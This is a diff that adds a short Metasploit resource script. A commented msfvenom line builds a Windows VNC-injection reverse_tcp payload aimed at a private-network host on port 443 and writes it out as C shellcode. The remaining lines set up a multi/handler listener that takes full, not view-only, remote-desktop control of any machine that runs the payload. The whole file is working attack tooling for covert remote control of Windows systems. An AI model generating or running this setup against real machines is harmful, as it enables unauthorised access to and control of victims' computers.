@@ -1,0 +1,10 @@
+#msfvenom -p windows/vncinject/reverse_tcp LHOST=192.168.0.217 LPORT=443 -a x86 -f c 2>/dev/null | egrep "^\"" | tr -d "\"\n;" >vnc.mf
+use exploit/multi/handler
+set payload windows/vncinject/reverse_tcp
+set LPORT 443
+set LHOST 0.0.0.0
+#set ReverseListenerBindAddress 0.0.0.0
+#set AutoRunScript migrate -f
+set ViewOnly false
+show options 
+run -j
